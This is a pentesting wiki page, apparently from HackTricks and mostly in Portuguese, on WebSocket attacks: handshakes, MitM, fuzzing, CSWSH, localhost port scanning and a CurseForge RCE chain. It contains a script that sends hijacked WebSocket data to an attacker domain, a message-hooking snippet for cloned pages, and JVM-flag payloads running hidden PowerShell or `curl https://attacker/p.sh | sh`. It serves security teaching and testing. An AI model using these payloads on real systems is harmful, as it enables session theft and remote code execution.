# WebSocket Attacks

{{#include ../banners/hacktricks-training.md}}

## O que são WebSockets

As conexões WebSocket são estabelecidas através de um handshake inicial **HTTP** e são projetadas para ser **de longa duração**, permitindo troca de mensagens bidirecional a qualquer momento sem a necessidade de um sistema transacional. Isso torna os WebSockets particularmente vantajosos para aplicações que exigem **baixa latência ou comunicação iniciada pelo servidor**, como streams de dados financeiros em tempo real.

### Estabelecimento de Conexões WebSocket

Uma explicação detalhada sobre como estabelecer conexões WebSocket pode ser acessada [**here**](https://infosecwriteups.com/cross-site-websocket-hijacking-cswsh-ce2a6b0747fc). Em resumo, conexões WebSocket geralmente são iniciadas via JavaScript no lado do cliente, como mostrado abaixo:
```javascript
var ws = new WebSocket("wss://normal-website.com/ws")
```
O protocolo `wss` indica uma conexão WebSocket protegida por **TLS**, enquanto `ws` indica uma conexão **não segura**.

Durante o estabelecimento da conexão, é realizado um handshake entre o navegador e o servidor sobre HTTP. O processo de handshake envolve o navegador enviando uma requisição e o servidor respondendo, como ilustrado nos exemplos a seguir:

Browser sends a handshake request:
```javascript
GET /chat HTTP/1.1
Host: normal-website.com
Sec-WebSocket-Version: 13
Sec-WebSocket-Key: wDqumtseNBJdhkihL6PW7w==
Connection: keep-alive, Upgrade
Cookie: session=KOsEJNuflw4Rd9BDNrVmvwBF9rEijeE2
Upgrade: websocket
```
Resposta do handshake do servidor:
```javascript
HTTP/1.1 101 Switching Protocols
Connection: Upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 0FFP+2nmNIf/h+4BP36k9uzrYGk=
```
A conexão permanece aberta para troca de mensagens em ambas as direções uma vez estabelecida.

**Pontos-chave do handshake do WebSocket:**

- Os cabeçalhos `Connection` e `Upgrade` sinalizam o início de um handshake do WebSocket.
- O cabeçalho `Sec-WebSocket-Version` indica a versão desejada do protocolo WebSocket, normalmente `13`.
- Um valor aleatório codificado em Base64 é enviado no cabeçalho `Sec-WebSocket-Key`, garantindo que cada handshake seja único, o que ajuda a prevenir problemas com proxies de cache. Esse valor não serve para autenticação, mas para confirmar que a resposta não foi gerada por um servidor ou cache mal configurado.
- O cabeçalho `Sec-WebSocket-Accept` na resposta do servidor é um hash do `Sec-WebSocket-Key`, verificando a intenção do servidor de abrir uma conexão WebSocket.

Esses recursos garantem que o processo de handshake seja seguro e confiável, abrindo caminho para uma comunicação em tempo real eficiente.

### Console Linux

Você pode usar `websocat` para estabelecer uma conexão raw com um websocket.
```bash
websocat --insecure wss://10.10.10.10:8000 -v
```
Ou para criar um servidor websocat:
```bash
websocat -s 0.0.0.0:8000 #Listen in port 8000
```
### Conexões websocket MitM

Se você descobrir que clients estão conectados a um **HTTP websocket** a partir da sua rede local atual, você poderia tentar um [ARP Spoofing Attack ](../generic-methodologies-and-resources/pentesting-network/index.html#arp-spoofing) para realizar um ataque MitM entre o client e o server.\
Uma vez que o client esteja tentando conectar-se a você, você pode então usar:
```bash
websocat -E --insecure --text ws-listen:0.0.0.0:8000 wss://10.10.10.10:8000 -v
```
### Enumeração de Websockets

Você pode usar a **ferramenta** [**https://github.com/PalindromeLabs/STEWS**](https://github.com/PalindromeLabs/STEWS) **para descobrir, fingerprint e procurar por vulnerabilidades conhecidas** em websockets automaticamente.

### Ferramentas de Debug para Websocket

- **Burp Suite** suporta comunicação MitM de websockets de forma muito similar à que faz para comunicação HTTP regular.
- A extensão [**socketsleuth**](https://github.com/snyk/socketsleuth) **para Burp Suite** permitirá gerenciar melhor comunicações Websocket no Burp obtendo o **history**, definindo **interception rules**, usando regras de **match and replace**, e usando **Intruder** e **AutoRepeater.**
- [**WSSiP**](https://github.com/nccgroup/wssip)**:** Abreviação de "**WebSocket/Socket.io Proxy**", esta ferramenta, escrita em Node.js, fornece uma interface para **capture, intercept, send custom** messages e visualizar todas as comunicações WebSocket e Socket.IO entre o cliente e o servidor.
- [**wsrepl**](https://github.com/doyensec/wsrepl) é um **interactive websocket REPL** projetado especificamente para penetration testing. Ele fornece uma interface para observar **incoming websocket messages and sending new ones**, com um framework fácil de usar para **automating** esta comunicação.
- [**https://websocketking.com/**](https://websocketking.com/) é uma interface web para comunicar-se com outras aplicações usando **websockets**.
- [**https://hoppscotch.io/realtime/websocket**](https://hoppscotch.io/realtime/websocket) entre outros tipos de comunicações/protocolos, fornece uma interface web para comunicar-se com outras aplicações usando **websockets.**

## Decrypting Websocket

- [https://github.com/Anof-cyber/PyCript](https://github.com/Anof-cyber/PyCript)
- [https://github.com/Anof-cyber/PyCript-WebSocket/](https://github.com/Anof-cyber/PyCript-WebSocket/)

## Websocket Lab

No [**Burp-Suite-Extender-Montoya-Course**](https://github.com/federicodotta/Burp-Suite-Extender-Montoya-Course) você encontra um código para lançar uma aplicação web usando websockets e neste [**post**](https://security.humanativaspa.it/extending-burp-suite-for-fun-and-profit-the-montoya-way-part-3/) você pode encontrar uma explicação.

## Websocket Fuzzing

A extensão do Burp [**Backslash Powered Scanner**](https://github.com/PortSwigger/backslash-powered-scanner) agora também permite fuzzar mensagens WebSocket. Você pode ler mais informações sobre isso [**aqui**](https://arete06.com/posts/fuzzing-ws/#adding-websocket-support-to-backslash-powered-scanner).

### WebSocket Turbo Intruder (extensão do Burp)

O WebSocket Turbo Intruder da PortSwigger traz scripting em Python no estilo Turbo Intruder e fuzzing de alta taxa para WebSockets. Instale-o a partir do BApp Store ou do código-fonte. Inclui dois componentes:

- Turbo Intruder: envio de mensagens em alto volume para um único endpoint WS usando engines customizadas.
- HTTP Middleware: expõe um endpoint HTTP local que encaminha bodies como mensagens WS sobre uma conexão persistente, permitindo que qualquer scanner baseado em HTTP teste backends WS.

Padrão básico de script para fuzzar um endpoint WS e filtrar respostas relevantes:
```python
def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(upgrade_request)
for i in range(10):
connection.queue(message, str(i))

def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@MatchRegex(r'{\"user\":\"Hal Pline\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Use decoradores como `@MatchRegex(...)` para reduzir o ruído quando uma única mensagem dispara múltiplas respostas.

### Bridge WS por trás do HTTP (HTTP Middleware)

Encapsule uma conexão WS persistente e encaminhe corpos HTTP como mensagens WS para testes automatizados com scanners HTTP:
```python
def create_connection(upgrade_request):
connection = websocket_connection.create(upgrade_request)
return connection

@MatchRegex(r'{\"user\":\"You\"')
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Então envie HTTP localmente; o corpo é encaminhado como a mensagem WS:
```http
POST /proxy?url=https%3A%2F%2Ftarget/ws HTTP/1.1
Host: 127.0.0.1:9000
Content-Length: 16

{"message":"hi"}
```
Isso permite que você controle backends WS enquanto filtra eventos “interessantes” (por exemplo, erros SQLi, auth bypass, comportamento de command injection).

### Manipulação do Socket.IO (handshake, heartbeats, events)

Socket.IO adiciona seu próprio framing por cima do WS. Detecte-o via o parâmetro de query obrigatório `EIO` (por exemplo, `EIO=4`). Mantenha a sessão viva com Ping (`2`) e Pong (`3`) e inicie a conversa com `"40"`, depois emita eventos como `42["message","hello"]`.

Exemplo do Intruder:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def queue_websockets(upgrade_request, message):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.queue('42["message","hello"]')

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
Variante do HTTP adapter:
```python
import burp.api.montoya.http.message.params.HttpParameter as HttpParameter

def create_connection(upgrade_request):
connection = websocket_connection.create(
upgrade_request.withUpdatedParameters(HttpParameter.urlParameter("EIO", "4")))
connection.queue('40')
connection.decIn()
return connection

@Pong("3")
def handle_outgoing_message(websocket_message):
results_table.add(websocket_message)

@PingPong("2", "3")
def handle_incoming_message(websocket_message):
results_table.add(websocket_message)
```
### Detectando server‑side prototype pollution via Socket.IO

Seguindo a técnica de detecção segura do PortSwigger, tente poluir os internos do Express enviando um payload como:
```json
{"__proto__":{"initialPacket":"Polluted"}}
```
If greetings or behavior change (e.g., echo includes "Polluted"), you likely polluted server-side prototypes. Impact depends on reachable sinks; correlate with the gadgets in the Node.js prototype pollution section. See:

- Check [NodeJS – __proto__ & prototype Pollution](deserialization/nodejs-proto-prototype-pollution/README.md) for sinks/gadgets and chaining ideas.

### WebSocket race conditions with Turbo Intruder

O engine padrão agrupa mensagens em uma conexão (ótimo throughput, ruim para races). Use o engine THREADED para spawnar múltiplas conexões WS e disparar payloads em paralelo para acionar races de lógica (double‑spend, token reuse, state desync). Comece pelo script de exemplo e ajuste a concorrência em `config()`.

- Aprenda a metodologia e alternativas em [Race Condition](race-condition.md) (veja “RC in WebSockets”).

### WebSocket DoS: malformed frame “Ping of Death”

Crie frames WS cujo header declara um comprimento de payload enorme mas sem enviar o corpo. Alguns servidores WS confiam no comprimento e pré-alocam buffers; defini-lo próximo de `Integer.MAX_VALUE` pode causar Out‑Of‑Memory e um DoS remoto não autenticado. Veja o script de exemplo.

### CLI and debugging

- Headless fuzzing: `java -jar WebSocketFuzzer-<version>.jar <scriptFile> <requestFile> <endpoint> <baseInput>`
- Enable the WS Logger to capture and correlate messages using internal IDs.
- Use `inc*`/`dec*` helpers on `Connection` to tweak message ID handling in complex adapters.
- Decorators like `@PingPong`/`@Pong` and helpers like `isInteresting()` reduce noise and keep sessions alive.

### Operational safety

Fuzzing WS em altas taxas pode abrir muitas conexões e enviar milhares de mensagens por segundo. Frames malformed e altas taxas podem causar DoS real. Use apenas onde permitido.

## Cross-site WebSocket hijacking (CSWSH)

**Cross-site WebSocket hijacking**, também conhecido como **cross-origin WebSocket hijacking**, é identificado como um caso específico de **[Cross-Site Request Forgery (CSRF)](csrf-cross-site-request-forgery.md)** que afeta os handshakes de WebSocket. Esta vulnerabilidade surge quando os handshakes de WebSocket se autenticam somente via **HTTP cookies** sem **CSRF tokens** ou medidas de segurança semelhantes.

Um atacante pode explorar isso hospedando uma **malicious web page** que inicia uma conexão cross-site WebSocket com a aplicação vulnerável. Consequentemente, essa conexão é tratada como parte da sessão da vítima com a aplicação, explorando a falta de proteção CSRF no mecanismo de gestão de sessão.

Para que esse ataque funcione, são necessários os seguintes requisitos:

- A autenticação do websocket **must be cookie based**
- O cookie deve ser acessível a partir do servidor do atacante (isso normalmente significa **`SameSite=None`**) e sem **Firefox Total Cookie Protection** habilitado no Firefox e sem **blocked third-party cookies** no Chrome.
- O websocket server must not check the origin of the connection (ou isso deve ser possível de burlar)

Além disso:

- Se a autenticação for baseada em uma conexão local (para localhost ou para uma rede local) o ataque **will be possible** já que nenhuma proteção atual o proíbe (check [more info here](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/))

### Simple Attack

Note que ao **estabelecer** uma conexão **websocket** o **cookie** é **sent** para o servidor. O **servidor** pode estar a usá-lo para **relacionar** cada **usuário específico** com a sua **sessão websocket** baseada no cookie enviado.

Então, se por **exemplo** o **servidor websocket** **envia de volta o histórico da conversa** de um usuário quando uma mensagem com "**READY**" é enviada, então um **simples XSS** que estabeleça a conexão (o **cookie** será **enviado** **automaticamente** para autorizar o usuário vítima) e **envie** "**READY**" poderá **recuperar** o histórico da **conversa**.
```html
<script>
websocket = new WebSocket('wss://your-websocket-URL')
websocket.onopen = start
websocket.onmessage = handleReply
function start(event) {
websocket.send("READY"); //Send the message to retreive confidential information
}
function handleReply(event) {
//Exfiltrate the confidential information to attackers server
fetch('https://your-collaborator-domain/?'+event.data, {mode: 'no-cors'})
}
</script>
```
### Cross Origin + Cookie com um subdomínio diferente

Neste post do blog [https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/](https://snyk.io/blog/gitpod-remote-code-execution-vulnerability-websockets/) o atacante conseguiu **executar Javascript arbitrário em um subdomínio** do domínio onde a comunicação do websocket estava ocorrendo. Como era um **subdomínio**, o **cookie** estava sendo **enviado**, e como o **Websocket não verificava corretamente o Origin**, era possível se comunicar com ele e **roubar tokens dele**.

### Roubando dados do usuário

Copie a aplicação web que você deseja se passar (os arquivos .html, por exemplo) e dentro do script onde a comunicação do websocket está ocorrendo adicione este código:
```javascript
//This is the script tag to load the websocket hooker
;<script src="wsHook.js"></script>

//These are the functions that are gonig to be executed before a message
//is sent by the client or received from the server
//These code must be between some <script> tags or inside a .js file
wsHook.before = function (data, url) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "client_msg?m=" + data, true)
xhttp.send()
}
wsHook.after = function (messageEvent, url, wsObject) {
var xhttp = new XMLHttpRequest()
xhttp.open("GET", "server_msg?m=" + messageEvent.data, true)
xhttp.send()
return messageEvent
}
```
Agora baixe o arquivo `wsHook.js` de [https://github.com/skepticfx/wshook](https://github.com/skepticfx/wshook) e **salve-o dentro da pasta com os arquivos web**.\
Ao expor a aplicação web e fazer um usuário conectar-se a ela você poderá capturar as mensagens enviadas e recebidas via websocket:
```javascript
sudo python3 -m http.server 80
```
### Proteções contra CSWSH

O ataque CSWSH baseia-se no fato de que um **usuário acessará uma página maliciosa** que irá **abrir uma websocket connection** para uma página web onde o usuário já está autenticado e se autenticará como ele, já que a requisição enviará os cookies do usuário.

Hoje em dia, é muito fácil prevenir esse problema:

- **Verificação do Origin no websocket server**: O websocket server deve sempre verificar de onde um usuário está se conectando para evitar que páginas inesperadas se conectem a ele.
- **Token de autenticação**: Em vez de basear a autenticação em um cookie, a conexão websocket pode ser baseada em um token gerado pelo servidor para o usuário e desconhecido ao atacante (como um anti-CSRF token).
- **Atributo SameSite do cookie**: Cookies com valor `SameSite` como `Lax` ou `Strict` não serão enviados de uma página atacante externa para o servidor da vítima; portanto, a autenticação baseada em cookie não terá sucesso. Observe que o Chrome agora define o valor **`Lax`** por padrão para cookies que não especificam essa flag, tornando isso mais seguro por padrão. Entretanto, nos primeiros 2 minutos após a criação do cookie ele terá o valor **`None`**, tornando-o vulnerável durante esse período limitado (também espera-se que essa medida seja removida em algum momento).
- **Firefox Total Cookie Protection**: Total Cookie Protection funciona isolando cookies para o site em que são criados. Essencialmente cada site tem seu próprio particionamento de armazenamento de cookies para impedir que terceiros vinculem o histórico de navegação de um usuário. Isso torna o **CSWSH inutilizável**, pois o site do atacante não terá acesso aos cookies.
- **Bloqueio de third-party cookies no Chrome**: Isso também pode impedir o envio do cookie do usuário autenticado para o websocket server mesmo com `SameSite=None`.

### Localhost WebSocket abuse & browser port discovery

Desktop launchers frequentemente iniciam helpers (e.g., CurseForge's `CurseAgent.exe`) que expõem JSON-RPC WebSockets em `127.0.0.1:<random_port>`. O navegador **não aplica SOP em sockets de loopback**, então qualquer página Web pode tentar o handshake. Se o agente aceita valores arbitrários em `Origin` e pula autenticação secundária, a superfície de IPC torna-se controlável remotamente diretamente a partir de JavaScript.

#### Enumerando métodos expostos

Capture uma sessão legítima para aprender o contrato do protocolo. O CurseForge, por exemplo, emite frames como `{"type":"method","name":"minecraftTaskLaunchInstance","args":[{...}]}` onde `name` é o método RPC e `args` contém objetos estruturados (GUIDs, resolução, flags, etc.). Uma vez conhecida essa estrutura, você pode invocar métodos como `createModpack`, `minecraftGetDefaultLocation`, ou qualquer outra tarefa privilegiada diretamente a partir de uma página injetada.

#### Descoberta de portas via navegador

Como o helper faz bind a uma porta alta aleatória, o exploit primeiro força bruta o localhost via WebSockets. Navegadores baseados em Chromium toleram ~16k upgrades falhados antes de throttling, o que é suficiente para percorrer a faixa efêmera; o Firefox tende a travar ou congelar após algumas centenas de falhas, então PoCs práticos costumam visar o Chromium.

<details>
<summary>Scanner mínimo do navegador</summary>
```javascript
async function findLocalWs(start = 20000, end = 36000) {
for (let port = start; port <= end; port++) {
await new Promise((resolve) => {
const ws = new WebSocket(`ws://127.0.0.1:${port}/`);
let settled = false;
const finish = () => { if (!settled) { settled = true; resolve(); } };
ws.onerror = ws.onclose = finish;
ws.onopen = () => {
console.log(`Found candidate on ${port}`);
ws.close();
finish();
};
});
}
}
```
</details>

Uma vez que uma conexão passa pelo handshake e retorna dados específicos do protocolo, reutilize esse socket para a cadeia RPC.

#### Encadeando métodos JSON-RPC para RCE

O exploit do CurseForge encadeia duas chamadas não autenticadas:

1. `createModpack` → returns a new `MinecraftInstanceGuid` without user interaction.
2. `minecraftTaskLaunchInstance` → launches that GUID while accepting arbitrary JVM flags through `AdditionalJavaArguments`.

JNI/JVM diagnostic options then provide a turnkey RCE primitive. For example, cap the metaspace to force a crash and leverage the error hook for command execution:
```
-XX:MaxMetaspaceSize=16m -XX:OnOutOfMemoryError="cmd.exe /c powershell -nop -w hidden -EncodedCommand ..."
```
Em alvos Unix, simplesmente troque o payload por `/bin/sh -c 'curl https://attacker/p.sh | sh'`. Isso funciona mesmo quando você não pode tocar no código da aplicação — controlar o JVM CLI é suficiente.

Esse “create resource → privileged launch” pattern aparece frequentemente em atualizadores e iniciadores. Sempre que o método (1) produzir um identificador rastreado pelo servidor e o método (2) executar código ou criar um processo com esse identificador, verifique se argumentos controlados pelo usuário podem ser injetados.


## Condições de corrida

Condições de corrida em WebSockets também existem, [consulte esta informação para saber mais](race-condition.md#rc-in-websockets).

## Outras vulnerabilidades

Como Web Sockets são um mecanismo para **enviar dados para o lado do servidor e para o lado do cliente**, dependendo de como o servidor e o cliente tratam a informação, **Web Sockets podem ser usados para explorar várias outras vulnerabilidades como XSS, SQLi ou qualquer outra vulnerabilidade web comum usando a entrada de um usuário a partir de um websocket.**

## **WebSocket Smuggling**

Essa vulnerabilidade pode permitir que você **contorne as restrições de proxies reversos** ao fazê-los acreditar que uma **comunicação websocket foi estabelecida** (mesmo que não seja verdade). Isso pode permitir que um atacante **acesse endpoints ocultos**. Para mais informações, veja a página a seguir:


{{#ref}}
h2c-smuggling.md
{{#endref}}

## Referências

- [https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages](https://portswigger.net/web-security/websockets#intercepting-and-modifying-websocket-messages)
- [https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/](https://blog.includesecurity.com/2025/04/cross-site-websocket-hijacking-exploitation-in-2025/)
- [WebSocket Turbo Intruder: Unearthing the WebSocket Goldmine](https://portswigger.net/research/websocket-turbo-intruder-unearthing-the-websocket-goldmine)
- [WebSocket Turbo Intruder – BApp Store](https://portswigger.net/bappstore/ba292c5982ea426c95c9d7325d9a1066)
- [WebSocketTurboIntruder – GitHub](https://github.com/d0ge/WebSocketTurboIntruder)
- [Turbo Intruder background](https://portswigger.net/research/turbo-intruder-embracing-the-billion-request-attack)
- [Server-side prototype pollution – safe detection methods](https://portswigger.net/research/server-side-prototype-pollution#safe-detection-methods-for-manual-testers)
- [WS RaceCondition PoC (Java)](https://github.com/redrays-io/WS_RaceCondition_PoC)
- [RaceConditionExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/RaceConditionExample.py)
- [PingOfDeathExample.py](https://github.com/d0ge/WebSocketTurboIntruder/blob/main/src/main/resources/examples/PingOfDeathExample.py)
- [When WebSockets Lead to RCE in CurseForge](https://elliott.diy/blog/curseforge/)

{{#include ../banners/hacktricks-training.md}}
